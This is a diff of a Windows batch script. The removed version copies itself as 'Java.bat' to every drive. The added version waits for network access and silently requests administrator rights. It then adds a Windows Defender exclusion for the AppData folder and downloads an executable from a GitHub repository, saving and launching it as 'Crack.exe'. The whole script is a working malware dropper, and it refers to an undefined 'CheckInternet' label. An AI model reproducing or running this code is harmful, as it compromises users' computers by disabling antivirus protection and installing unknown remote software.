@@ -1,38 +1,24 @@
 @echo off
-setlocal enabledelayedexpansion
-
-:: Request admin if not elevated
-net session >nul 2>&1
-if %errorlevel% NEQ 0 (
-    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
+set FILE="%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
+if exist %FILE% (
     exit /b
 )
-
-set "SELF=%~f0"
-
-for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist "%%D:\" (
-        set "FOLDER=System %%D"
-        set "FOLDERPATH=%%D:\!FOLDER!"
-        set "TARGETBAT=!FOLDERPATH!\Java.bat"
-
-        echo Creating folder "!FOLDERPATH!" on drive %%D
-        mkdir "!FOLDERPATH!" 2>nul
-        if exist "!FOLDERPATH!" (
-            echo Copying script to "!TARGETBAT!"
-            copy "%SELF%" "!TARGETBAT!" >nul
-            if exist "!TARGETBAT!" (
-                echo Successfully copied Java.bat to drive %%D
-            ) else (
-                echo Failed to copy Java.bat to drive %%D
-            )
-        ) else (
-            echo Failed to create folder on drive %%D
-        )
-    )
+ping -n 1 8.8.8.8 >nul 2>&1
+if errorlevel 1 (
+    timeout /t 5 /nobreak >nul 2>&1
+    goto CheckInternet
 )
-
-pause
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
+    exit /b
+)
+set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
+start "" "%TARGET_FILE%"
 exit
 
 
